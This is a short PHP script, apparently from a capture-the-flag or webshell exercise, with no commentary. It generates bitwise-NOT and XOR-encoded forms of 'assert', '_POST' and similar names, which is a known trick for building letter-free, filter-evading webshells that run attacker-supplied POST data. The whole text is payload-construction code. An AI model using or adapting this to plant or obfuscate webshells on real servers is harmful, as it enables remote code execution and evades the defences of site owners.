<?php
$_= urlencode(~('assert'));
$__ = urlencode(~('_POST'));
var_dump($_);
var_dump($__);
echo (urldecode('%ff%ff%ff%ff^%a0%b8%ba%ab')^urldecode('%a0%b8%ba%ab'));
echo (urldecode('%fe%fe%fe%fe')^urldecode('%a1%b9%bb%aa'));